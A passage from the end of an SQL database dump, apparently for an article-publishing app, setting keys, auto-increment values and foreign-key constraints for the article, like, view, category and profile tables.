  ADD PRIMARY KEY (`id_profile`),
  ADD UNIQUE KEY `UUID` (`UUID`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `article`
--
ALTER TABLE `article`
  MODIFY `article_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=35;

--
-- AUTO_INCREMENT for table `article_like`
--
ALTER TABLE `article_like`
  MODIFY `id_article_like` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- AUTO_INCREMENT for table `article_view`
--
ALTER TABLE `article_view`
  MODIFY `id_article_view` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=425;

--
-- AUTO_INCREMENT for table `category`
--
ALTER TABLE `category`
  MODIFY `category_id` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=24;

--
-- AUTO_INCREMENT for table `profile`
--
ALTER TABLE `profile`
  MODIFY `id_profile` int NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=19;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `article`
--
ALTER TABLE `article`
  ADD CONSTRAINT `fk_category_id` FOREIGN KEY (`category_id`) REFERENCES `category` (`category_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  ADD CONSTRAINT `fk_id_profile` FOREIGN KEY (`id_profile`) REFERENCES `profile` (`id_profile`) ON DELETE RESTRICT ON UPDATE RESTRICT;

--
-- Constraints for table `article_like`
--
ALTER TABLE `article_like`
  ADD CONSTRAINT `fk_article_id_like` FOREIGN KEY (`article_id`) REFERENCES `article` (`article_id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  ADD CONSTRAINT `fk_id_profile_like` FOREIGN KEY (`id_profile`) REFERENCES `profile` (`id_profile`) ON DELETE CASCADE ON UPDATE RESTRICT;

--
-- Constraints for table `article_view`
--
ALTER TABLE `article_view`
  ADD CONSTRAINT `fk_article_id_view` FOREIGN KEY (`article_id`) REFERENCES `article` (`article_id`) ON DELETE CASCADE ON UPDATE RESTRICT,
  ADD CONSTRAINT `fk_profile_id_view` FOREIGN KEY (`id_profile`) REFERENCES `profile` (`id_profile`) ON DELETE CASCADE ON UPDATE RESTRICT;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
